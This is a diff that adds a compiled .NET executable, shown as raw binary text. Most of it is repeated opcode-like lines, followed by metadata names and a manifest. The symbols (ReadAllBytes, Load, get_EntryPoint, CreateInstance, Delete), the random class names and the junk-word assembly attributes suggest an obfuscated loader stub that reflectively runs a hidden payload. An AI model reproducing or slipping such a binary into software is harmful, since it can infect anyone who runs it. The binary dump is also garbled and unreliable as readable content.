@@ -1,0 +1,1006 @@
+!This program cannot be run in DOS mode.
+.text
+`.rsrc
+@.reloc
+	r!	
+	r	'
+	r!*
+	r)+
+	r1,
+	r9-
+	rA.
+	rI/
+	rQ0
+	rY1
+	ra2
+	ri3
+	rq4
+	ry5
+	r	H
+	r!K
+	r)L
+	r1M
+	r9N
+	rAO
+	rIP
+	rQQ
+	rYR
+	raS
+	riT
+	rqU
+	ryV
+	r	i
+	r!l
+	r)m
+	r1n
+	r9o
+	rAp
+	rIq
+	rQr
+	rYs
+	rat
+	riu
+	rqv
+	ryw
+	r	/
+	r!2
+	r)3
+	r14
+	r95
+	rA6
+	rI7
+	rQ8
+	rY9
+	ra:
+	ri;
+	rq<
+	ry=
+	r	P
+	r!S
+	r)T
+	r1U
+	r9V
+	rAW
+	rIX
+	rQY
+	rYZ
+	ra[
+	ri\
+	rq]
+	ry^
+	r	q
+	r!t
+	r)u
+	r1v
+	r9w
+	rAx
+	rIy
+	rQz
+	rY{
+	ra|
+	ri}
+	rq~
+	rY 
+	ra!
+	ri"
+	rq#
+	ry$
+	r	7
+	r!:
+	r);
+	r1<
+	r9=
+	rA>
+	rI?
+	rQ@
+	rYA
+	raB
+	riC
+	rqD
+	ryE
+	r	X
+	r![
+	r)\
+	r1]
+	r9^
+	rA_
+	rI`
+	rQa
+	rYb
+	rac
+	rid
+	rqe
+	ryf
+	r	y
+	r!|
+	r)}
+	r1~
+	ri	
+	r!!
+	r)"
+	r1#
+	r9$
+	rA%
+	rI&
+	rQ'
+	rY(
+	ra)
+	ri*
+	rq+
+	ry,
+	r	?
+	r!B
+	r)C
+	r1D
+	r9E
+	rAF
+	rIG
+	rQH
+	rYI
+	raJ
+	riK
+	rqL
+	ryM
+	r	`
+	r!c
+	r)d
+	r1e
+	r9f
+	rAg
+	rIh
+	rQi
+	rYj
+	rak
+	ril
+	rqm
+	ryn
+	r)	
+	r	&
+	r!)
+	r)*
+	r1+
+	r9,
+	rA-
+	rI.
+	rQ/
+	rY0
+	ra1
+	ri2
+	rq3
+	ry4
+	r	G
+	r!J
+	r)K
+	r1L
+	r9M
+	rAN
+	rIO
+	rQP
+	rYQ
+	raR
+	riS
+	rqT
+	ryU
+	r	h
+	r!k
+	r)l
+	r1m
+	r9n
+	rAo
+	rIp
+	rQq
+	rYr
+	ras
+	rit
+	rqu
+	ryv
+	r	.
+	r!1
+	r)2
+	r13
+	r94
+	rA5
+	rI6
+	rQ7
+	rY8
+	ra9
+	ri:
+	rq;
+	ry<
+	r	O
+	r!R
+	r)S
+	r1T
+	r9U
+	rAV
+	rIW
+	rQX
+	rYY
+	raZ
+	ri[
+	rq\
+	ry]
+	r	p
+	r!s
+	r)t
+	r1u
+	r9v
+	rAw
+	rIx
+	rQy
+	rYz
+	ra{
+	ri|
+	rq}
+	ry~
+	ra 
+	ri!
+	rq"
+	ry#
+	r	6
+	r!9
+	r):
+	r1;
+	r9<
+	rA=
+	rI>
+	rQ?
+	rY@
+	raA
+	riB
+	rqC
+	ryD
+	r	W
+	r!Z
+	r)[
+	r1\
+	r9]
+	rA^
+	rI_
+	rQ`
+	rYa
+	rab
+	ric
+	rqd
+	rye
+	r	x
+	r!{
+	r)|
+	r1}
+	r9~
+	rq	
+	r! 
+	r)!
+	r1"
+	r9#
+	rA$
+	rI%
+	rQ&
+	rY'
+	ra(
+	ri)
+	rq*
+	ry+
+	r	>
+	r!A
+	r)B
+	r1C
+	r9D
+	rAE
+	rIF
+	rQG
+	rYH
+	raI
+	riJ
+	rqK
+	ryL
+	r	_
+	r!b
+	r)c
+	r1d
+	r9e
+	rAf
+	rIg
+	rQh
+	rYi
+	raj
+	rik
+	rql
+	rym
+	r1	
+	r	%
+	r!(
+	r))
+	r1*
+	r9+
+	rA,
+	rI-
+	rQ.
+	rY/
+	ra0
+	ri1
+	rq2
+	ry3
+	r	F
+	r!I
+	r)J
+	r1K
+	r9L
+	rAM
+	rIN
+	rQO
+	rYP
+	raQ
+	riR
+	rqS
+	ryT
+	r	g
+	r!j
+	r)k
+	r1l
+	r9m
+	rAn
+	rIo
+	rQp
+	rYq
+	rar
+	ris
+	rqt
+	ryu
+r3		p
+ru		p
+r% 	p
+rg 	p
+r-!	p
+ro!	p
+r5"	p
+rw"	p
+r=#	p
+rE$	p
+rM%	p
+rU&	p
+r]'	p
+r#(	p
+re(	p
+r+)	p
+rm)	p
+r3*	p
+ru*	p
+r;+	p
+r}+	p
+rC,	p
+r	-	p
+r	-	p
+r	-	p
+r	-	p
+r	-	p
+r	-	p
+	r	-	p
+r	-	p
+r	-	p
+r	-	p
+r	-	p
+r	-	p
+rK-	p
+rS.	p
+r[/	p
+r!0	p
+r!0	p
+r!0	p
+r!0	p
+r!0	p
+r!0	p
+	r!0	p
+r!0	p
+r!0	p
+r!0	p
+r!0	p
+r!0	p
+rc0	p
+r)1	p
+r)1	p
+r)1	p
+r)1	p
+r)1	p
+r)1	p
+	r)1	p
+r)1	p
+r)1	p
+r)1	p
+r)1	p
+r)1	p
+rk1	p
+r12	p
+r12	p
+r12	p
+r12	p
+r12	p
+r12	p
+	r12	p
+r12	p
+r12	p
+r12	p
+r12	p
+r12	p
+rs2	p
+r93	p
+r93	p
+r93	p
+r93	p
+r93	p
+r93	p
+	r93	p
+r93	p
+r93	p
+r93	p
+r93	p
+r93	p
+r{3	p
+rA4	p
+rA4	p
+rA4	p
+rA4	p
+rA4	p
+rA4	p
+	rA4	p
+rA4	p
+rA4	p
+rA4	p
+rA4	p
+rA4	p
+rI5	p
+rI5	p
+rI5	p
+rI5	p
+rI5	p
+rI5	p
+	rI5	p
+rI5	p
+rI5	p
+rI5	p
+rI5	p
+rI5	p
+rQ6	p
+rQ6	p
+rQ6	p
+rQ6	p
+rQ6	p
+rQ6	p
+	rQ6	p
+rQ6	p
+rQ6	p
+rQ6	p
+rQ6	p
+rQ6	p
+rY7	p
+rY7	p
+rY7	p
+rY7	p
+rY7	p
+rY7	p
+	rY7	p
+rY7	p
+rY7	p
+rY7	p
+rY7	p
+rY7	p
+ra8	p
+ra8	p
+ra8	p
+ra8	p
+ra8	p
+ra8	p
+	ra8	p
+ra8	p
+ra8	p
+ra8	p
+ra8	p
+ra8	p
+r'9	p
+ri9	p
+ri9	p
+ri9	p
+ri9	p
+ri9	p
+ri9	p
+	ri9	p
+ri9	p
+ri9	p
+ri9	p
+ri9	p
+ri9	p
+r/:	p
+rq:	p
+rq:	p
+rq:	p
+rq:	p
+rq:	p
+rq:	p
+	rq:	p
+rq:	p
+rq:	p
+rq:	p
+rq:	p
+rq:	p
+r7;	p
+ry;	p
+ry;	p
+ry;	p
+ry;	p
+ry;	p
+ry;	p
+	ry;	p
+ry;	p
+ry;	p
+ry;	p
+ry;	p
+ry;	p
+r?<	p
+rG=	p
+rO>	p
+rW?	p
+r_@	p
+r%A	p
+rgA	p
+r-B	p
+roB	p
+r5C	p
+rwC	p
+r=D	p
+rEE	p
+rMF	p
+rUG	p
+r]H	p
+r#I	p
+reI	p
+r+J	p
+rmJ	p
+r3K	p
+ruK	p
+r;L	p
+r}L	p
+rCM	p
+r	N	p
+r	N	p
+r	N	p
+r	N	p
+r	N	p
+r	N	p
+	r	N	p
+r	N	p
+r	N	p
+r	N	p
+r	N	p
+r	N	p
+rKN	p
+rSO	p
+r[P	p
+r!Q	p
+r!Q	p
+r!Q	p
+r!Q	p
+r!Q	p
+r!Q	p
+	r!Q	p
+r!Q	p
+r!Q	p
+r!Q	p
+r!Q	p
+r!Q	p
+rcQ	p
+r)R	p
+r)R	p
+r)R	p
+r)R	p
+r)R	p
+r)R	p
+	r)R	p
+r)R	p
+r)R	p
+r)R	p
+r)R	p
+r)R	p
+rkR	p
+r1S	p
+r1S	p
+r1S	p
+r1S	p
+r1S	p
+r1S	p
+	r1S	p
+r1S	p
+r1S	p
+r1S	p
+r1S	p
+r1S	p
+rsS	p
+r9T	p
+r9T	p
+r9T	p
+r9T	p
+r9T	p
+r9T	p
+	r9T	p
+r9T	p
+r9T	p
+r9T	p
+r9T	p
+r9T	p
+r{T	p
+rAU	p
+rAU	p
+rAU	p
+rAU	p
+rAU	p
+rAU	p
+	rAU	p
+rAU	p
+rAU	p
+rAU	p
+rAU	p
+rAU	p
+rIV	p
+rIV	p
+rIV	p
+rIV	p
+rIV	p
+rIV	p
+	rIV	p
+rIV	p
+rIV	p
+rIV	p
+rIV	p
+rIV	p
+rQW	p
+rQW	p
+rQW	p
+rQW	p
+rQW	p
+rQW	p
+	rQW	p
+rQW	p
+rQW	p
+rQW	p
+rQW	p
+rQW	p
+rYX	p
+rYX	p
+rYX	p
+rYX	p
+rYX	p
+rYX	p
+	rYX	p
+rYX	p
+rYX	p
+rYX	p
+rYX	p
+rYX	p
+raY	p
+raY	p
+raY	p
+raY	p
+raY	p
+raY	p
+	raY	p
+raY	p
+raY	p
+raY	p
+raY	p
+raY	p
+r'Z	p
+riZ	p
+riZ	p
+riZ	p
+riZ	p
+riZ	p
+riZ	p
+	riZ	p
+riZ	p
+riZ	p
+riZ	p
+riZ	p
+riZ	p
+r/[	p
+rq[	p
+rq[	p
+rq[	p
+rq[	p
+rq[	p
+rq[	p
+	rq[	p
+rq[	p
+rq[	p
+rq[	p
+rq[	p
+rq[	p
+r7\	p
+ry\	p
+ry\	p
+ry\	p
+ry\	p
+ry\	p
+ry\	p
+	ry\	p
+ry\	p
+ry\	p
+ry\	p
+ry\	p
+ry\	p
+r?]	p
+rG^	p
+rO_	p
+rW`	p
+r_a	p
+r%b	p
+rgb	p
+r-c	p
+roc	p
+r5d	p
+rwd	p
+r=e	p
+rEf	p
+rMg	p
+rUh	p
+r]i	p
+r#j	p
+rej	p
+r+k	p
+rmk	p
+r3l	p
+rul	p
+r;m	p
+r}m	p
+rCn	p
+r	o	p
+r	o	p
+r	o	p
+r	o	p
+r	o	p
+r	o	p
+	r	o	p
+r	o	p
+r	o	p
+r	o	p
+r	o	p
+r	o	p
+rKo	p
+rSp	p
+r[q	p
+r!r	p
+r!r	p
+r!r	p
+r!r	p
+r!r	p
+r!r	p
+	r!r	p
+r!r	p
+r!r	p
+r!r	p
+r!r	p
+r!r	p
+rcr	p
+r)s	p
+r)s	p
+r)s	p
+r)s	p
+r)s	p
+r)s	p
+	r)s	p
+r)s	p
+r)s	p
+r)s	p
+r)s	p
+r)s	p
+rks	p
+r1t	p
+r1t	p
+r1t	p
+r1t	p
+r1t	p
+r1t	p
+	r1t	p
+r1t	p
+r1t	p
+r1t	p
+r1t	p
+r1t	p
+rst	p
+r9u	p
+r9u	p
+r9u	p
+r9u	p
+r9u	p
+r9u	p
+	r9u	p
+r9u	p
+r9u	p
+r9u	p
+r9u	p
+r9u	p
+r{u	p
+rAv	p
+rAv	p
+rAv	p
+rAv	p
+rAv	p
+rAv	p
+	rAv	p
+rAv	p
+rAv	p
+rAv	p
+rAv	p
+rAv	p
+rIw	p
+rIw	p
+rIw	p
+rIw	p
+rIw	p
+rIw	p
+	rIw	p
+rIw	p
+rIw	p
+rIw	p
+rIw	p
+rIw	p
+rQx	p
+rQx	p
+rQx	p
+rQx	p
+rQx	p
+rQx	p
+	rQx	p
+rQx	p
+rQx	p
+rQx	p
+rQx	p
+rQx	p
+rYy	p
+rYy	p
+rYy	p
+rYy	p
+rYy	p
+rYy	p
+	rYy	p
+rYy	p
+rYy	p
+rYy	p
+rYy	p
+rYy	p
+raz	p
+raz	p
+raz	p
+raz	p
+raz	p
+raz	p
+	raz	p
+raz	p
+raz	p
+raz	p
+raz	p
+raz	p
+r'{	p
+ri{	p
+ri{	p
+ri{	p
+ri{	p
+ri{	p
+ri{	p
+	ri{	p
+ri{	p
+ri{	p
+ri{	p
+ri{	p
+ri{	p
+r/|	p
+rq|	p
+rq|	p
+rq|	p
+rq|	p
+rq|	p
+rq|	p
+	rq|	p
+rq|	p
+rq|	p
+rq|	p
+rq|	p
+rq|	p
+r7}	p
+ry}	p
+ry}	p
+ry}	p
+ry}	p
+ry}	p
+ry}	p
+	ry}	p
+ry}	p
+ry}	p
+ry}	p
+ry}	p
+ry}	p
+r?~	p
+	ri 
+	rq!
+	ry"
+*BSJB
+v2.0.50727
+#Strings
+#GUID
+#Blob
+Class1
+<Module>
+System.IO
+mscorlib
+Load
+get_StackTrace
+CreateInstance
+get_Message
+File
+Console
+get_Name
+GetDirectoryName
+WriteLine
+Delete
+GuidAttribute
+DebuggableAttribute
+ComVisibleAttribute
+AssemblyTitleAttribute
+AssemblyTrademarkAttribute
+AssemblyFileVersionAttribute
+AssemblyConfigurationAttribute
+AssemblyDescriptionAttribute
+CompilationRelaxationsAttribute
+AssemblyProductAttribute
+AssemblyCopyrightAttribute
+AssemblyCompanyAttribute
+RuntimeCompatibilityAttribute
+prelecturedexe.exe
+prelecturedexe
+dsjhfcgfnjsghfuytaweyajgshdfsdf
+osieyrgvbsgnhkflkstesadfakdhaksjfgyjqqwgjrwgehjgfdjgdffg
+ToString
+Path
+proteusdlll
+Program
+System
+Main
+get_Location
+System.Reflection
+Exception
+MethodInfo
+MemberInfo
+.ctor
+System.Diagnostics
+System.Runtime.InteropServices
+System.Runtime.CompilerServices
+DebuggingModes
+GetFiles
+ReadAllBytes
+args
+Exists
+Concat
+Object
+get_EntryPoint
+GetExecutingAssembly
+Directory
+WrapNonExceptionThrows
+KSupersympathetic elegit epopoeia contrariness encirclement collaborationism
+Nchigwell preinvasive aboral taxableness charlottetown semigod unelbowed nautch
+HTheatregoer undemonstrational indianize atroceruleous resolute biochemic
+Ivenetian norse unweighted epexegetical icbm perfervour pitchlike diseased
+Nobturator groundnut segner nonsensitization underfringe joint kiloampere lousy
+Gliquefaction fluoridated negationist tacitus bud. Dunsinane acidophilus
+$87845340-1543-5459-0901-132456767956
+23.25.47.59
+_CorExeMain
+mscoree.dll
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
+  <assemblyIdentity version="1.0.0.0" name="MyApplication.app"/>
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
+    <security>
+      <requestedPrivileges xmlns="urn:schemas-microsoft-com:asm.v3">
+        <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+</assembly>
